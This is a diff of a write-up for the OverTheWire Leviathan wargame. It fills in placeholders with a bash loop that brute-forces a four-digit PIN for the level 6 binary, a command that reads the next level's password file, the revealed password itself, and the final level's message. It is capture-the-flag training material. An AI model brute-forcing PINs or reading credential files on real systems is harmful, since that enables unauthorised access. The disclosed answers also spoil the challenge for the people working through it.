@@ -366,16 +366,33 @@ puts("Wrong"Wrong
 )                                                    = 6
 +++ exited (status 0) +++
 <<<
-
-XXX
 ```
-
-Helpful Links:
-* https://en.wikipedia.org/wiki/Code_injection
+```
+# Okay let's just brute force this
+for i in $(seq -f "%04g" 0 9999); do echo $i; ~/leviathan6 $i; done
+>>>
+...
+Wrong
+7119
+Wrong
+7120
+Wrong
+7121
+Wrong
+7122
+Wrong
+7123
+$ whoami
+leviathan7
+<<<
+```
+```
+vim /etc/leviathan_pass/leviathan7
+```
 
 Output:
 ```
-XXX
+ahy7MaeBo9
 ```
 
 
@@ -384,24 +401,19 @@ XXX
 
 ##  Level 6 → Level 7
 Connect: ```ssh leviathan7@leviathan.labs.overthewire.org  -p 2223```      
-Password: ```XXX```
+Password: ```ahy7MaeBo9```
 
 Problem:
 - There is no information for this level, intentionally.
 
 Solution:
 ```
-XXX
-```
-
-Attempt:
-```
-XXX
+vim CONGRATULATIONS
 ```
 
 Output:
 ```
-XXX
+Well Done, you seem to have used a *nix system before, now try something more serious.
 ```
 
 
